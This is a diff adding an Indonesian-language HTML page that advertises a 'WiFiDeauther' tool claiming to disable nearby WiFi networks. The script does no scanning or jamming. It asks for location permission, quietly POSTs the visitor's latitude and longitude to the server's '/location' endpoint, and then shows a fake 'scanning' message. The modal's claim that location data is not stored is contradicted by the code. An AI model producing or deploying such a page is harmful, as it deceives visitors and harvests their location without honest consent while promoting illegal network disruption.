@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Entopix — Damaging Wifi Signal</title>
+  
+    <meta property="og:title" content="Entopix — Damaging Wifi Signal">
+  <meta property="og:description" content="Merusak sinyal wifi disekitar kamu dengan system website canggih..">
+  <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ByexeOfficial999/image-to-url@main/1000558810.png">
+  <meta property="og:url" content="https://EntopiX.com">
+  <meta property="og:type" content="website">
+
+  <meta property="og:site_name" content="Entopix — Damaging Wifi Signal">
+</head>
+
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --blue: #1a6bff;
+      --blue-dark: #0e50d6;
+      --blue-light: #e8f0ff;
+      --blue-glow: rgba(26, 107, 255, 0.18);
+      --text: #0d1117;
+      --text-muted: #6b7280;
+      --white: #ffffff;
+      --border: #e5e8f0;
+      --radius: 16px;
+    }
+
+    html, body {
+      height: 100%;
+    }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: #ffffff;
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+    }
+
+    /* Background subtle grid */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(26,107,255,0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(26,107,255,0.04) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* Radial glow */
+    body::after {
+      content: '';
+      position: fixed;
+      top: -20%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 800px;
+      height: 600px;
+      background: radial-gradient(ellipse, rgba(26,107,255,0.08) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* NAV */
+    nav {
+      position: relative;
+      z-index: 10;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 20px 48px;
+      border-bottom: 1px solid var(--border);
+      background: rgba(255,255,255,0.85);
+      backdrop-filter: blur(12px);
+    }
+
+    .nav-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-family: 'Syne', sans-serif;
+      font-weight: 800;
+      font-size: 1.2rem;
+      color: var(--text);
+      text-decoration: none;
+    }
+
+    .nav-logo .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--blue);
+      box-shadow: 0 0 8px var(--blue);
+      animation: pulse-dot 2s infinite;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.7); }
+    }
+
+    .nav-badge {
+      font-size: 0.72rem;
+      font-weight: 500;
+      color: var(--blue);
+      background: var(--blue-light);
+      border: 1px solid rgba(26,107,255,0.2);
+      padding: 4px 12px;
+      border-radius: 100px;
+      letter-spacing: 0.04em;
+    }
+
+    /* MAIN */
+    main {
+      position: relative;
+      z-index: 1;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 60px 24px;
+      text-align: center;
+    }
+
+    .tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.75rem;
+      font-weight: 500;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--blue);
+      margin-bottom: 28px;
+    }
+
+    .tag::before, .tag::after {
+      content: '';
+      display: block;
+      width: 24px;
+      height: 1px;
+      background: var(--blue);
+      opacity: 0.5;
+    }
+
+    h1 {
+      font-family: 'Syne', sans-serif;
+      font-weight: 800;
+      font-size: clamp(2.4rem, 5vw, 4rem);
+      line-height: 1.1;
+      letter-spacing: -0.02em;
+      max-width: 700px;
+      margin-bottom: 18px;
+    }
+
+    h1 span {
+      color: var(--blue);
+      position: relative;
+    }
+
+    h1 span::after {
+      content: '';
+      position: absolute;
+      bottom: 2px;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: var(--blue);
+      border-radius: 2px;
+      opacity: 0.25;
+    }
+
+    .subtitle {
+      font-size: 1.05rem;
+      color: var(--text-muted);
+      max-width: 480px;
+      line-height: 1.65;
+      margin-bottom: 48px;
+      font-weight: 300;
+    }
+
+    /* WiFi radar animation */
+    .radar-wrapper {
+      position: relative;
+      width: 180px;
+      height: 180px;
+      margin: 0 auto 48px;
+    }
+
+    .radar-ring {
+      position: absolute;
+      border-radius: 50%;
+      border: 2px solid rgba(26,107,255,0.18);
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .radar-ring:nth-child(1) { width: 50px; height: 50px; border-color: rgba(26,107,255,0.5); }
+    .radar-ring:nth-child(2) { width: 90px; height: 90px; }
+    .radar-ring:nth-child(3) { width: 130px; height: 130px; }
+    .radar-ring:nth-child(4) { width: 170px; height: 170px; }
+
+    .radar-center {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      width: 18px; height: 18px;
+      border-radius: 50%;
+      background: var(--blue);
+      box-shadow: 0 0 16px rgba(26,107,255,0.6);
+    }
+
+    .radar-sweep {
+      position: absolute;
+      top: 50%; left: 50%;
+      width: 85px; height: 2px;
+      transform-origin: left center;
+      background: linear-gradient(90deg, rgba(26,107,255,0.9), transparent);
+      border-radius: 1px;
+      animation: sweep 3s linear infinite;
+    }
+
+    @keyframes sweep {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .radar-ping {
+      position: absolute;
+      border-radius: 50%;
+      border: 1.5px solid rgba(26,107,255,0.35);
+      animation: ping 3s ease-out infinite;
+      top: 50%; left: 50%;
+    }
+
+    .radar-ping:nth-child(6) { width: 10px; height: 10px; margin: -5px; animation-delay: 0s; }
+    .radar-ping:nth-child(7) { width: 10px; height: 10px; margin: -5px; animation-delay: 1s; }
+    .radar-ping:nth-child(8) { width: 10px; height: 10px; margin: -5px; animation-delay: 2s; }
+
+    @keyframes ping {
+      0% { width: 10px; height: 10px; margin: -5px; opacity: 0.8; }
+      100% { width: 180px; height: 180px; margin: -90px; opacity: 0; }
+    }
+
+    /* SCAN BUTTON */
+    .btn-scan {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      padding: 18px 44px;
+      background: var(--blue);
+      color: white;
+      font-family: 'Syne', sans-serif;
+      font-weight: 700;
+      font-size: 1rem;
+      letter-spacing: 0.01em;
+      border: none;
+      border-radius: 14px;
+      cursor: pointer;
+      transition: all 0.22s cubic-bezier(0.34, 1.56, 0.64, 1);
+      box-shadow: 0 4px 20px rgba(26,107,255,0.35), 0 1px 3px rgba(0,0,0,0.08);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-scan::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(255,255,255,0.15), transparent);
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .btn-scan:hover {
+      transform: translateY(-3px) scale(1.02);
+      box-shadow: 0 8px 32px rgba(26,107,255,0.45), 0 2px 6px rgba(0,0,0,0.1);
+      background: var(--blue-dark);
+    }
+
+    .btn-scan:hover::before { opacity: 1; }
+    .btn-scan:active { transform: translateY(0) scale(0.98); }
+
+    .btn-scan svg { flex-shrink: 0; }
+
+    .info-chips {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      justify-content: center;
+      margin-top: 36px;
+    }
+
+    .chip {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.78rem;
+      color: var(--text-muted);
+      background: #f5f7fc;
+      border: 1px solid var(--border);
+      padding: 6px 14px;
+      border-radius: 100px;
+    }
+
+    .chip svg { opacity: 0.6; }
+
+    /* FOOTER */
+    footer {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      padding: 20px 24px;
+      border-top: 1px solid var(--border);
+      font-size: 0.78rem;
+      color: var(--text-muted);
+      background: rgba(255,255,255,0.8);
+    }
+
+    footer strong { color: var(--blue); font-weight: 500; }
+
+    /* ===== MODAL OVERLAY ===== */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(10, 16, 30, 0.45);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.28s ease;
+    }
+
+    .modal-overlay.show {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    .modal {
+      background: white;
+      border-radius: 24px;
+      padding: 40px 36px 36px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 24px 64px rgba(0,0,0,0.15), 0 0 0 1px rgba(0,0,0,0.04);
+      transform: translateY(24px) scale(0.96);
+      transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .modal-overlay.show .modal {
+      transform: translateY(0) scale(1);
+    }
+
+    .modal-icon {
+      width: 72px;
+      height: 72px;
+      border-radius: 20px;
+      background: linear-gradient(135deg, #e8f0ff, #c8d9ff);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+    }
+
+    .modal h2 {
+      font-family: 'Syne', sans-serif;
+      font-weight: 700;
+      font-size: 1.35rem;
+      color: var(--text);
+      margin-bottom: 12px;
+      letter-spacing: -0.01em;
+    }
+
+    .modal p {
+      font-size: 0.9rem;
+      color: var(--text-muted);
+      line-height: 1.65;
+      margin-bottom: 28px;
+    }
+
+    .modal p strong {
+      color: var(--text);
+      font-weight: 500;
+    }
+
+    .modal-note {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      background: #fffbeb;
+      border: 1px solid #fde68a;
+      border-radius: 10px;
+      padding: 12px 14px;
+      margin-bottom: 28px;
+      text-align: left;
+    }
+
+    .modal-note p {
+      font-size: 0.78rem;
+      color: #92400e;
+      margin: 0;
+      line-height: 1.5;
+    }
+
+    .modal-note svg { flex-shrink: 0; margin-top: 1px; }
+
+    .btn-grant {
+      width: 100%;
+      padding: 15px;
+      background: var(--blue);
+      color: white;
+      font-family: 'Syne', sans-serif;
+      font-weight: 700;
+      font-size: 0.95rem;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 4px 14px rgba(26,107,255,0.35);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn-grant:hover {
+      background: var(--blue-dark);
+      box-shadow: 0 6px 20px rgba(26,107,255,0.45);
+      transform: translateY(-1px);
+    }
+
+    .btn-grant:active { transform: translateY(0); }
+
+    .btn-cancel {
+      width: 100%;
+      padding: 13px;
+      background: transparent;
+      color: var(--text-muted);
+      font-family: 'DM Sans', sans-serif;
+      font-weight: 400;
+      font-size: 0.88rem;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+      border-radius: 10px;
+      transition: color 0.2s, background 0.2s;
+    }
+
+    .btn-cancel:hover {
+      color: var(--text);
+      background: #f5f7fc;
+    }
+
+    /* Status toast */
+    .toast {
+      position: fixed;
+      bottom: 32px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: var(--text);
+      color: white;
+      padding: 12px 24px;
+      border-radius: 100px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      z-index: 2000;
+      opacity: 0;
+      transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+      white-space: nowrap;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .toast.success { background: #059669; }
+    .toast.denied { background: #dc2626; }
+
+    @media (max-width: 600px) {
+      nav { padding: 16px 20px; }
+      .modal { padding: 32px 24px 28px; }
+      h1 { font-size: 2rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <nav>
+    <a href="#" class="nav-logo">
+      <div class="dot"></div>
+      WiFiDeauther
+    </a>
+    <span class="nav-badge">Versi 1.0.2</span>
+  </nav>
+
+  <main>
+    <div class="tag">merusak sinyal wifi</div>
+
+    <h1>Matikan <span>WiFi</span><br>di Sekitar Kamu</h1>
+
+    <p class="subtitle">
+      Pindai jaringan nirkabel yang tersedia di sekitarmu secara instan. Butuh izin lokasi untuk mendeteksi sinyal terdekat.
+    </p>
+
+    <div class="radar-wrapper" aria-hidden="true">
+      <div class="radar-ring"></div>
+      <div class="radar-ring"></div>
+      <div class="radar-ring"></div>
+      <div class="radar-ring"></div>
+      <div class="radar-center"></div>
+      <div class="radar-sweep"></div>
+      <div class="radar-ping"></div>
+      <div class="radar-ping"></div>
+      <div class="radar-ping"></div>
+    </div>
+
+    <button class="btn-scan" onclick="openModal()" aria-label="Mulai pemindaian WiFi sekitar">
+      <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0" />
+      </svg>
+      Scan WiFi Sekitar
+    </button>
+
+    <div class="info-chips">
+      <div class="chip">
+        <svg width="13" height="13" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+        </svg>
+        Aman & Privat
+      </div>
+      <div class="chip">
+        <svg width="13" height="13" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+        </svg>
+        Work All Wifi
+      </div>
+      <div class="chip">
+        <svg width="13" height="13" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
+        </svg>
+        Berbasis Lokasi
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    Website ini <strong> benar-benar mematikan WiFi</strong> — segala penggunaan Platform ini sepenuhnya jadi tanggung jawab pengguna.
+  </footer>
+
+  <div class="modal-overlay" id="modalOverlay" onclick="handleOverlayClick(event)" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal">
+      <div class="modal-icon" aria-hidden="true">
+        <svg width="34" height="34" fill="none" viewBox="0 0 24 24" stroke="#1a6bff" stroke-width="1.8">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
+        </svg>
+      </div>
+
+      <h2 id="modalTitle">Izin Akses Lokasi</h2>
+
+      <p>
+        Untuk memindai jaringan WiFi di sekitarmu, website ini memerlukan <strong>izin akses lokasi</strong> perangkatmu. Data lokasi hanya digunakan untuk mendeteksi sinyal terdekat dan tidak disimpan.
+      </p>
+
+      <button class="btn-grant" onclick="requestLocation()" id="btnGrant">
+        <svg width="17" height="17" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+        </svg>
+        Beri Izin
+      </button>
+
+      <button class="btn-cancel" onclick="closeModal()">Tidak Sekarang</button>
+    </div>
+  </div>
+  
+  <div class="toast" id="toast" role="alert" aria-live="polite"></div>
+
+  <script>
+    const overlay = document.getElementById('modalOverlay');
+    const toast = document.getElementById('toast');
+    let toastTimer;
+
+    function openModal() {
+      overlay.classList.add('show');
+      document.body.style.overflow = 'hidden';
+      document.getElementById('btnGrant').focus();
+    }
+
+    function closeModal() {
+      overlay.classList.remove('show');
+      document.body.style.overflow = '';
+    }
+
+    function handleOverlayClick(e) {
+      if (e.target === overlay) closeModal();
+    }
+
+    function showToast(message, type = '') {
+      clearTimeout(toastTimer);
+      toast.textContent = message;
+      toast.className = 'toast show ' + type;
+      toastTimer = setTimeout(() => {
+        toast.className = 'toast';
+      }, 3500);
+    }
+
+    function requestLocation() {
+  if (!('geolocation' in navigator)) {
+    showToast('Lokasi tidak didukung browser ini.', 'denied');
+    closeModal();
+    return;
+  }
+
+  const btn = document.getElementById('btnGrant');
+  btn.textContent = 'Meminta izin...';
+  btn.disabled = true;
+  btn.style.opacity = '0.7';
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      fetch("/location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          lat: lat,
+          lon: lon
+        })
+      })
+      .then(res => res.text())
+      .then(() => {
+        console.log("Lokasi berhasil dikirim ke server");
+      })
+      .catch(err => {
+        console.error("Gagal kirim ke server:", err);
+      });
+
+      closeModal();
+      showToast('✓ Izin diberikan! Memindai jaringan sekitar...', 'success');
+
+      btn.innerHTML = `
+        <svg width="17" height="17" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+        </svg> Beri Izin`;
+      btn.disabled = false;
+      btn.style.opacity = '';
+    },
+
+    (err) => {
+      closeModal();
+
+      if (err.code === err.PERMISSION_DENIED) {
+        showToast('✕ Izin ditolak oleh pengguna.', 'denied');
+      } else {
+        showToast('⚠️ Gagal mendapatkan lokasi.', 'denied');
+      }
+
+      btn.innerHTML = `
+        <svg width="17" height="17" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+        </svg> Beri Izin`;
+      btn.disabled = false;
+      btn.style.opacity = '';
+    },
+
+    { enableHighAccuracy: false, timeout: 20000, maximumAge: 60000 }
+  );
+}
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') closeModal();
+    });
+  </script>
+</body>
+</html>
